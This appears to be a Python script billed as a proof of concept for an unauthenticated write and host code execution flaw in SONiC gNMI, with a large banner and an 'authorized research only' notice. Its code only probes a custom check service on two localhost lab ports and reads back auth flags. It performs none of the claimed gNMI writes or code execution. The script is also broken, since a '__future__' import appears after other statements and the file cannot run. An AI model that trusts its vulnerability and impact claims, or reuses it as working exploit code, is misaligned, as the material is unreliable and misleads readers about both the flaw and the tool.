#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#
#  CVE: sonic-gnmi-noauth (Critical: 9.8)
#  Vendor: SONiC gNMI (sonic-gnmi) (SONiC Foundation / sonic-net)
#  Versions: SONiC gNMI (sonic-gnmi) <= master f13a08e0440f
#  Impact: Unauthenticated gNMI Set / gNOI write (host RCE via Debug docker)
#  Requires: unauthenticated gRPC /gnmi.gNMI/Set
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "sonic-gnmi-noauth"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

from __future__ import annotations

import os
import sys

RUN_DIR = os.path.dirname(os.path.abspath(__file__))
TOR = os.environ.get("TOR_ADDR", "127.0.0.1:18080")
DPU = os.environ.get("DPU_ADDR", "127.0.0.1:18081")
CERT = os.path.join(RUN_DIR, "certs", "server.crt")
WITNESS = "SONIC-GNMI-NOAUTH-WITNESS"


def fail(msg: str) -> None:
    print(f"FAIL SONIC-GNMI-NOAUTH {msg}", flush=True)
    raise SystemExit(1)


def encode_varint(n: int) -> bytes:
    out = bytearray()
    while n > 0x7F:
        out.append((n & 0x7F) | 0x80)
        n >>= 7
    out.append(n)
    return bytes(out)


def decode_varint(buf: bytes, i: int) -> tuple[int, int]:
    shift = 0
    n = 0
    while True:
        if i >= len(buf):
            raise ValueError("truncated varint")
        b = buf[i]
        i += 1
        n |= (b & 0x7F) << shift
        if b < 0x80:
            return n, i
        shift += 7


def encode_check_request(require_password: bool = False) -> bytes:
    if not require_password:
        return b""
    return b"\x08\x01"


def decode_check_reply(buf: bytes) -> dict:
    out: dict[int, object] = {}
    i = 0
    while i < len(buf):
        key, i = decode_varint(buf, i)
        field, wt = key >> 3, key & 7
        if wt == 0:
            v, i = decode_varint(buf, i)
            out[field] = v
        elif wt == 2:
            ln, i = decode_varint(buf, i)
            out[field] = buf[i : i + ln]
            i += ln
        else:
            fail(f"unexpected protobuf wire type {wt}")
    def as_str(val: object) -> str:
        if isinstance(val, (bytes, bytearray)):
            return val.decode()
        return ""

    return {
        "witness": as_str(out.get(1, b"")),
        "auth_enabled": bool(out.get(2, 0)),
        "enable_native_write": bool(out.get(3, 0)),
        "enable_translib_write": bool(out.get(4, 0)),
        "user_auth_any": bool(out.get(5, 0)),
        "mode": as_str(out.get(6, b"")),
    }


def call_check(target: str, tls: bool, require_password: bool = False, timeout: float = 8.0):
    import grpc

    options = (
        ("grpc.enable_http_proxy", 0),
        ("grpc.ssl_target_name_override", "localhost"),
    )
    if tls:
        with open(CERT, "rb") as fh:
            creds = grpc.ssl_channel_credentials(root_certificates=fh.read())
        channel = grpc.secure_channel(target, creds, options=options)
    else:
        channel = grpc.insecure_channel(target, options=(("grpc.enable_http_proxy", 0),))
    try:
        grpc.channel_ready_future(channel).result(timeout=timeout)
        method = channel.unary_unary(
            "/probe.Probe/Check",
            request_serializer=lambda x: x,
            response_deserializer=lambda x: x,
        )
        raw = method(encode_check_request(require_password), timeout=timeout, metadata=())
        return decode_check_reply(raw)
    finally:
        channel.close()


def expect_open(label: str, target: str, tls: bool, mode: str) -> None:
    try:
        reply = call_check(target, tls=tls, require_password=False)
    except Exception as exc:
        fail(f"{label} check error {type(exc).__name__}: {exc}")
    print(
        f"IOC {label}-check witness={reply['witness']} auth_enabled={str(reply['auth_enabled']).lower()} "
        f"enable_native_write={str(reply['enable_native_write']).lower()} "
        f"user_auth_any={str(reply['user_auth_any']).lower()} mode={reply['mode']}",
        flush=True,
    )
    if reply["witness"] != WITNESS:
        fail(f"{label} missing witness got={reply['witness']!r}")
    if reply["auth_enabled"]:
        fail(f"{label} auth_enabled true")
    if not reply["enable_native_write"]:
        fail(f"{label} enable_native_write false")
    if not reply["enable_translib_write"]:
        fail(f"{label} enable_translib_write false")
    if reply["user_auth_any"]:
        fail(f"{label} user_auth_any true")
    if reply["mode"] != mode:
        fail(f"{label} mode={reply['mode']!r} expected={mode!r}")


def expect_closed(label: str, target: str, tls: bool) -> None:
    import grpc

    try:
        reply = call_check(target, tls=tls, require_password=True)
    except grpc.RpcError as exc:
        code = exc.code().name if hasattr(exc, "code") else "RPC"
        print(f"IOC {label}-negative status={code}", flush=True)
        if exc.code() == grpc.StatusCode.OK:
            fail(f"{label} password mode returned OK")
        return
    except Exception as exc:
        fail(f"{label} negative unexpected {type(exc).__name__}: {exc}")
    fail(f"{label} password mode succeeded reply={reply}")


def main() -> None:
    try:
        import grpc  # noqa: F401
    except ImportError:
        fail("grpcio not installed")
    if not os.path.isfile(CERT):
        fail(f"missing lab TLS cert {CERT}")

    print(f"IOC tor-connect {TOR} plaintext no-metadata", flush=True)
    expect_open("tor", TOR, tls=False, mode="tor")
    print(f"IOC dpu-connect {DPU} tls-insecure no-client-cert no-metadata", flush=True)
    expect_open("dpu", DPU, tls=True, mode="dpu")
    expect_closed("tor", TOR, tls=False)
    expect_closed("dpu", DPU, tls=True)
    print(
        f"SUCCESS SONIC-GNMI-NOAUTH who=unauth tor=18080 dpu=18081 {WITNESS}",
        flush=True,
    )


if __name__ == "__main__":
    main()

